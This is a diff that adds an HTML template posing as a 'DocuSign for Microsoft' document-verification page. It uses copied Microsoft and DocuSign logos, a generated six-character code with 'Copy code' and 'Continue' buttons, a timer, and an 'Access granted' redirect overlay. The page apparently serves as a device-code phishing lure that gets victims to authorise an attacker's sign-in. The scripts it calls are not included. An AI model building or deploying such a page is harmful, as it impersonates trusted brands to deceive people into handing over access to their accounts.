@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{{TITLE}}</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--ms-blue:#0067B8;--ms-blue-hover:#005da6;--ms-blue-light:#eff6fc;--ms-dark:#1b1b1b;--ms-gray-bg:#f3f2f1;--ms-gray-border:#d2d0ce;--ms-gray-text:#605e5c;--ms-white:#FFFFFF;--ms-green:#107c41;--radius-lg:8px;--radius-md:4px;--shadow-card:0 3.2px 7.2px 0 rgba(0,0,0,.13),0 .6px 1.8px 0 rgba(0,0,0,.11)}
+body{font-family:'Segoe UI',-apple-system,sans-serif;background-color:#f0f4f8;background-image:linear-gradient(to right,rgba(200,215,235,.3) 1px,transparent 1px),linear-gradient(to bottom,rgba(200,215,235,.3) 1px,transparent 1px);background-size:32px 32px;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px}
+.card{background:var(--ms-white);border-radius:var(--radius-lg);box-shadow:var(--shadow-card);border:1px solid rgba(0,0,0,.06);width:100%;max-width:480px;overflow:hidden;padding:40px 36px 32px 36px;display:flex;flex-direction:column;align-items:center;text-align:center}
+.brand-header-row{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
+.ms-grid-logo{display:grid;grid-template-columns:repeat(2,9px);grid-template-rows:repeat(2,9px);gap:2px}
+.ms-grid-square{width:9px;height:9px}
+.ms-sq-1{background:#f25022}.ms-sq-2{background:#7fba00}.ms-sq-3{background:#01a4ef}.ms-sq-4{background:#ffb900}
+.brand-separator{font-weight:600;color:#707070;font-size:14px}
+.docusign-logo-img{width:28px;height:28px;object-fit:contain;display:inline-block;border-radius:4px}
+.brand-title-text{font-size:15px;font-weight:600;color:#262626;letter-spacing:-.2px}
+.card-title{font-size:22px;font-weight:600;color:var(--ms-dark);line-height:1.3;margin-bottom:12px;letter-spacing:-.3px}
+.card-subtitle{font-size:13.5px;color:var(--ms-gray-text);line-height:1.5;margin-bottom:24px;max-width:390px}
+.doc-preview-box{width:100%;border:1px solid var(--ms-gray-border);border-radius:6px;padding:12px 16px;display:flex;align-items:center;gap:12px;background:#faf9f8;margin-bottom:24px;text-align:left}
+.doc-file-icon{width:34px;height:42px;background:#fff;border:1px solid #c8c6c4;border-radius:2px;display:flex;flex-direction:column;padding:5px 4px;position:relative;flex-shrink:0}
+.doc-file-fold{position:absolute;top:0;right:0;width:10px;height:10px;background:linear-gradient(135deg,transparent 50%,#c8c6c4 50%)}
+.doc-file-lines{display:flex;flex-direction:column;gap:3px;margin-top:8px;width:100%}
+.doc-file-line{height:2px;background:#8a8886;border-radius:1px;width:100%}
+.doc-file-line:nth-child(2){width:70%}
+.doc-info-text h4{font-size:13px;font-weight:600;color:#201f1e;margin-bottom:2px}
+.doc-info-text p{font-size:12px;color:var(--ms-gray-text)}
+.btn-primary{background:var(--ms-blue);color:#fff;border:none;border-radius:var(--radius-md);padding:12px 20px;font-size:14px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px;transition:background .15s;width:100%}
+.btn-primary:hover{background:var(--ms-blue-hover)}
+.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed}
+.code-panel{display:none;width:100%;margin-top:4px;text-align:left}
+.code-panel.show{display:block;animation:slideUp .25s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.code-box{background:#faf9f8;border:1px solid var(--ms-gray-border);border-radius:6px;padding:20px;text-align:center;margin-bottom:16px}
+.code-value{font-family:'SF Mono','Roboto Mono',Consolas,monospace;font-size:34px;font-weight:700;letter-spacing:8px;color:#201f1e;user-select:all;transition:opacity .15s}
+.code-value.loading{opacity:.35;font-size:20px;letter-spacing:2px;color:#8a8886}
+.code-hint{font-size:12px;color:var(--ms-gray-text);margin-top:6px}
+.timer-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.timer-pill{background:#eff6fc;color:var(--ms-blue);font-size:11.5px;font-weight:600;padding:3px 10px;border-radius:12px}
+.timer-pill.expired{background:#fde7e9;color:#a80000}
+.refresh-btn{background:none;border:none;color:var(--ms-blue);font-size:12.5px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:4px}
+.refresh-btn:hover{text-decoration:underline}
+.action-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px}
+.btn-secondary{background:transparent;border:1px solid var(--ms-gray-border);color:#323130;padding:11px;border-radius:var(--radius-md);font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px}
+.btn-secondary:hover{border-color:var(--ms-blue);color:var(--ms-blue);background:var(--ms-blue-light)}
+.status-text{font-size:12px;text-align:center;margin-top:10px;min-height:18px;color:var(--ms-gray-text)}
+.status-text.error{color:#a80000;background:#fde7e9;padding:6px;border-radius:4px}
+.footer-links{display:flex;justify-content:center;gap:16px;font-size:12px;color:#605e5c;margin-top:28px;width:100%}
+.footer-links a{color:#605e5c;text-decoration:none}
+.footer-links a:hover{text-decoration:underline}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);backdrop-filter:blur(2px);align-items:center;justify-content:center;z-index:100}
+.overlay.show{display:flex}
+.overlay-card{background:#fff;padding:36px;border-radius:var(--radius-lg);text-align:center;width:320px;box-shadow:var(--shadow-card)}
+.check-icon{width:48px;height:48px;background:#dff6dd;color:var(--ms-green);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 14px}
+.overlay-card h3{font-size:17px;font-weight:600;color:#201f1e;margin-bottom:6px}
+.overlay-card p{font-size:13px;color:var(--ms-gray-text)}
+@media(max-width:520px){body{padding:12px}.card{padding:28px 20px 24px 20px}.card-title{font-size:19px}.action-row{grid-template-columns:1fr}.code-value{font-size:28px;letter-spacing:5px}.footer-links{gap:10px;font-size:11px;flex-wrap:wrap}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="brand-header-row">
+<div class="ms-grid-logo"><div class="ms-grid-square ms-sq-1"></div><div class="ms-grid-square ms-sq-2"></div><div class="ms-grid-square ms-sq-3"></div><div class="ms-grid-square ms-sq-4"></div></div>
+<span class="brand-separator">+</span>
+<img src="data:image/jpeg;base64,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" alt="DocuSign Logo" class="docusign-logo-img">
+<span class="brand-title-text">DocuSign for Microsoft</span>
+</div>
+<h1 class="card-title">{{TITLE}}</h1>
+<p class="card-subtitle">{{MESSAGE}}</p>
+<div class="doc-preview-box">
+<div class="doc-file-icon"><div class="doc-file-fold"></div><div class="doc-file-lines"><div class="doc-file-line"></div><div class="doc-file-line"></div></div></div>
+<div class="doc-info-text">
+<h4>{{FILE_NAME}}</h4>
+<p>{{PAGES_LABEL}}</p>
+</div>
+</div>
+<button class="btn-primary" id="startBtn" onclick="generateCode()">{{BUTTON_TEXT}}</button>
+<div class="code-panel" id="codePanel">
+<div id="codeLoadedView">
+<div class="code-box">
+<div class="code-value" id="codeValue">· · · · · ·</div>
+<div class="code-hint">Use this code to complete verification on your device.</div>
+</div>
+<div class="timer-row">
+<div class="timer-pill" id="timerPill"></div>
+<button class="refresh-btn" id="refreshBtn" onclick="refreshCode()">
+<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg> Get new code
+</button>
+</div>
+<div class="action-row" id="actionRow">
+<button class="btn-secondary" id="copyBtn" onclick="copyAndOpenPopup()">
+<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy code
+</button>
+<button class="btn-primary" id="verifyBtn" onclick="verifyWithCopy()" style="margin:0;width:100%">
+<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg> Continue
+</button>
+</div>
+</div>
+<div class="status-text" id="statusMsg"></div>
+</div>
+<div class="footer-links">
+<a href="#">Microsoft account</a><span>·</span><a href="#">DocuSign</a><span>·</span><a href="#">Security</a><span>·</span><a href="#">Privacy</a>
+</div>
+</div>
+<div class="overlay" id="overlay">
+<div class="overlay-card">
+<div class="check-icon">✓</div>
+<h3>Access granted</h3>
+<p id="overlayMsg">Identity verified successfully.<br>Redirecting to your document…</p>
+</div>
+</div>
+</body>
+</html>
